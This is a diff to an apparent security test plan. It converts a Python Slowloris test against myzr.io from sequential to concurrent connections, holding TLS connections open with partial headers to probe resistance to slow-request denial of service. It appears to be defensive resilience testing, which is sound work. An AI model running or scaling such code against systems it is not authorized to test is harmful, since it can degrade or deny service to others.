@@ -55,11 +55,10 @@ WebSocket tests (python3):
 ### RE1-RE4 Additional Tests
 
 ```python
-# RE1 — Slowloris
-import socket, ssl, time
+# RE1 — Slowloris (concurrent connections via ThreadPoolExecutor)
+import socket, ssl, time, concurrent.futures
 context = ssl.create_default_context()
-results = []
-for i in range(5):
+def slowloris_conn(i):
     try:
         s = socket.create_connection(('myzr.io', 443), timeout=10)
         ss = context.wrap_socket(s, server_hostname='myzr.io')
@@ -68,10 +67,12 @@ for i in range(5):
         ss.send(b'X-Test: partial\r\n')
         time.sleep(3)
         ss.send(b'X-Test2: still-open\r\n')
-        results.append(f'{i}: still open after 6s')
         ss.close()
+        return f'{i}: still open after 6s'
     except Exception as e:
-        results.append(f'{i}: closed ({type(e).__name__})')
+        return f'{i}: closed ({type(e).__name__})'
+with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
+    results = list(executor.map(slowloris_conn, range(5)))
 for r in results: print(r)
 ```
 
